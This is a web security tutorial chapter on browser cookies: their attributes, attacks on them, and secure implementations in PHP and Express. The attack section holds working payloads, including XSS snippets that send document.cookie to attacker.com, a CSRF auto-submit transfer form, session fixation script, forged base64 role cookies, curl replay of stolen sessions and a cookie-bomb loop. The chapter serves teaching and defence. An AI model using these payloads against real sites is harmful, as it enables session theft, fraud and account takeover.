# 1. COOKIES <a name="cookies"></a>

## 1.1 HOW COOKIES WORK

### Cookie Basics

**Cookie**: Small piece of data stored by browser, sent with every request to the same domain.

**Setting a Cookie (Server):**
```http
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123; Path=/; Domain=example.com; Secure; HttpOnly; SameSite=Strict
```

**Sending Cookie (Client):**
```http
GET /page HTTP/1.1
Host: example.com
Cookie: session_id=abc123
```

---

## 1.2 COOKIE ATTRIBUTES

### 1.2.1 Domain Attribute

**Purpose:** Specifies which domains can receive the cookie

**Examples:**

```http
# Cookie for exact domain only
Set-Cookie: id=123; Domain=example.com

# Cookie accessible by subdomains too
Set-Cookie: id=123; Domain=.example.com
# Accessible by: example.com, www.example.com, api.example.com

# No Domain attribute = current domain only (most restrictive)
Set-Cookie: id=123
```

**Security Impact:**

```bash
# VULNERABLE: Domain=.example.com
# Allows subdomain.example.com to set cookies for example.com!

# Attacker registers: evil.example.com
# Sets cookie:
Set-Cookie: session=attacker_value; Domain=.example.com

# When user visits example.com, attacker's cookie sent!
# Possible session fixation
```

### 1.2.2 Path Attribute

**Purpose:** Specifies URL path that must exist in requested URL

**Examples:**

```http
# Cookie sent for all paths
Set-Cookie: id=123; Path=/

# Cookie only sent for /admin and subdirectories
Set-Cookie: admin_token=xyz; Path=/admin

# Cookie only for specific path
Set-Cookie: data=abc; Path=/api/v1
```

**Security Impact:**

```bash
# Narrower Path = better security
# Limits cookie exposure

# Cookie with Path=/admin
# Not sent to: http://site.com/
# Only sent to: http://site.com/admin
```

### 1.2.3 Secure Attribute

**Purpose:** Cookie only sent over HTTPS

**Example:**

```http
Set-Cookie: session=abc123; Secure

# Cookie sent:
# https://example.com ✓
# http://example.com  ✗ (not sent)
```

**Security Impact:**

```bash
# WITHOUT Secure:
# Cookie sent over HTTP → vulnerable to sniffing

# WITH Secure:
# Cookie only over HTTPS → protected by TLS encryption

# Attack scenario:
# 1. User logs in via HTTPS → session cookie set
# 2. User clicks http://example.com link (no 's')
# 3. Without Secure flag: Cookie sent over HTTP!
# 4. Attacker sniffs network → session hijacked

# With Secure flag: Cookie not sent over HTTP → protected
```

### 1.2.4 HttpOnly Attribute

**Purpose:** Cookie not accessible via JavaScript (document.cookie)

**Example:**

```http
Set-Cookie: session=abc123; HttpOnly

# JavaScript cannot access:
console.log(document.cookie); // session cookie not shown
```

**Security Impact:**

```javascript
// WITHOUT HttpOnly:
// XSS vulnerability → steal cookie
<script>
document.location='http://attacker.com/steal?c='+document.cookie;
</script>
// Attacker gets session cookie!

// WITH HttpOnly:
<script>
document.location='http://attacker.com/steal?c='+document.cookie;
</script>
// Session cookie not in document.cookie → protected from XSS theft
```

### 1.2.5 SameSite Attribute

**Purpose:** Controls when cookie is sent with cross-site requests (CSRF protection)

**Values:**

```http
# Strict: Cookie only sent for same-site requests
Set-Cookie: session=abc123; SameSite=Strict

# Lax: Cookie sent for top-level navigation from other sites
Set-Cookie: session=abc123; SameSite=Lax

# None: Cookie sent for all requests (requires Secure)
Set-Cookie: tracking=xyz; SameSite=None; Secure
```

**Examples:**

```bash
# SameSite=Strict
# User on https://evil.com clicks link to https://bank.com
# Cookie NOT sent → user appears logged out
# User types https://bank.com in address bar
# Cookie sent → user logged in

# SameSite=Lax (default in modern browsers)
# User on https://evil.com clicks link to https://bank.com
# Cookie sent (top-level navigation)
# AJAX request from https://evil.com to https://bank.com
# Cookie NOT sent

# SameSite=None
# All cross-site requests include cookie
# Vulnerable to CSRF!
```

**Security Impact:**

```html
<!-- CSRF Attack -->
<!-- Victim logged into https://bank.com -->
<!-- Attacker's site: https://evil.com/csrf.html -->

<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>

<!-- Without SameSite (or SameSite=None): -->
<!-- Cookie sent with cross-site POST → Transfer succeeds! -->

<!-- With SameSite=Strict or Lax: -->
<!-- Cookie NOT sent with cross-site POST → Transfer blocked! -->
```

### 1.2.6 Expires / Max-Age Attributes

**Purpose:** Set cookie lifetime

**Examples:**

```http
# Expires: Absolute time
Set-Cookie: id=123; Expires=Wed, 21 Oct 2025 07:28:00 GMT

# Max-Age: Relative time (seconds)
Set-Cookie: id=123; Max-Age=3600  # 1 hour
Set-Cookie: id=123; Max-Age=86400 # 24 hours

# Session cookie (no Expires or Max-Age)
Set-Cookie: session=abc123
# Deleted when browser closes
```

**Security Impact:**

```bash
# Long expiration = longer attack window
Set-Cookie: session=abc; Max-Age=31536000  # 1 year!
# If session stolen, attacker has 1 year access

# Short expiration = better security
Set-Cookie: session=abc; Max-Age=1800  # 30 minutes
# Stolen session expires quickly

# Session cookies (no expiration)
# Expire when browser closes
# But: browser "restore session" may persist them!
```

---

## 1.3 COOKIE MANIPULATION & ATTACKS

### 1.3.1 Cookie Tampering

**Modifying Cookie Values:**

```bash
# Original cookie
Cookie: user_id=123; role=user

# Tamper in browser (F12 → Console):
document.cookie = "user_id=123; role=admin"

# Or use Burp Suite:
# Intercept request
# Modify cookie values
# Forward

# Example attacks:

# 1. Privilege escalation
Cookie: role=user
# Change to:
Cookie: role=admin

# 2. Access other users' data
Cookie: user_id=100
# Change to:
Cookie: user_id=101

# 3. Price manipulation
Cookie: price=100
# Change to:
Cookie: price=1

# 4. Boolean flags
Cookie: isPremium=false
# Change to:
Cookie: isPremium=true
```

**Exploiting Weak Integrity Checks:**

```bash
# If cookie is base64 encoded (not encrypted):
Cookie: data=eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0=

# Decode:
echo "eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0=" | base64 -d
# Output: {"user":"john","role":"user"}

# Modify:
echo '{"user":"john","role":"admin"}' | base64
# Output: eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbiJ9

# Use modified cookie:
Cookie: data=eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbiJ9

# If no signature validation → privilege escalation!
```

### 1.3.2 Cookie Injection

**Adding Malicious Cookies:**

```javascript
// Via XSS
<script>
document.cookie = "admin=true; path=/";
document.cookie = "role=administrator; path=/";
</script>

// Via subdomain (if Domain=.example.com)
// evil.example.com sets:
document.cookie = "session=attacker_value; domain=.example.com; path=/";
// Now example.com receives this cookie!
```

**Session Fixation via Cookie:**

```html
<!-- Attacker's page -->
<script>
// Set specific session ID
document.cookie = "PHPSESSID=attacker_session; path=/; domain=.vulnerable-site.com";

// Redirect to login
window.location = "https://vulnerable-site.com/login";
</script>

<!-- Victim logs in with fixed session -->
<!-- Attacker uses same session → logged in as victim -->
```

### 1.3.3 Cookie Theft

**Via XSS (if no HttpOnly):**

```javascript
// Steal cookies
<script>
var cookies = document.cookie;
new Image().src = 'http://attacker.com/steal?c=' + encodeURIComponent(cookies);
</script>

// Exfiltrate all cookies
<script>
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: document.cookie
});
</script>
```

**Via Network Sniffing (if no Secure):**

```bash
# Captured HTTP traffic
GET /page HTTP/1.1
Cookie: session=abc123def456; user_id=100

# Attacker uses captured cookies
curl -b "session=abc123def456; user_id=100" http://site.com/account
```

### 1.3.4 Cookie Overflow / Bomb

**Denial of Service:**

```javascript
// Create many large cookies
<script>
for(var i=0; i<100; i++) {
    document.cookie = "cookie" + i + "=" + "A".repeat(4000);
}
// Browser may crash or refuse to send cookies
// Server may reject request
</script>
```

---

## 1.4 SECURE COOKIE IMPLEMENTATION

**Best Practices:**

```php
<?php
// PHP Secure Cookie

// Set secure cookie
setcookie(
    'session_id',                    // Name
    $secure_session_value,           // Value
    [
        'expires' => time() + 1800,  // 30 minutes
        'path' => '/',
        'domain' => 'example.com',   // Specific domain
        'secure' => true,            // HTTPS only
        'httponly' => true,          // No JavaScript access
        'samesite' => 'Strict'       // CSRF protection
    ]
);

// Sign cookie for integrity
$data = json_encode(['user_id' => 123, 'role' => 'user']);
$signature = hash_hmac('sha256', $data, 'secret_key');
$signed_cookie = base64_encode($data) . '.' . $signature;

setcookie('user_data', $signed_cookie, [
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);

// Verify cookie signature
function verify_cookie($cookie) {
    list($data_b64, $signature) = explode('.', $cookie);
    $data = base64_decode($data_b64);
    $expected_signature = hash_hmac('sha256', $data, 'secret_key');
    
    if (!hash_equals($expected_signature, $signature)) {
        die('Cookie tampering detected!');
    }
    
    return json_decode($data, true);
}
?>
```

```javascript
// Node.js/Express Secure Cookie

const cookieParser = require('cookie-parser');
const cookieSession = require('cookie-session');

// Signed cookies
app.use(cookieParser('secret-signing-key'));

app.get('/set', (req, res) => {
    // Set signed cookie
    res.cookie('user_data', {userId: 123, role: 'user'}, {
        signed: true,        // Sign cookie
        httpOnly: true,      // No JS access
        secure: true,        // HTTPS only
        sameSite: 'strict',  // CSRF protection
        maxAge: 1800000      // 30 minutes
    });
    res.send('Cookie set');
});

// Read signed cookie
app.get('/get', (req, res) => {
    // Automatically verified
    const userData = req.signedCookies.user_data;
    
    if (!userData) {
        return res.status(400).send('Invalid cookie');
    }
    
    res.send(userData);
});

// Encrypted cookie session
app.use(cookieSession({
    name: 'session',
    keys: ['key1', 'key2'],  // Rotation keys
    maxAge: 30 * 60 * 1000,  // 30 minutes
    secure: true,
    httpOnly: true,
    sameSite: 'strict'
}));
```

---
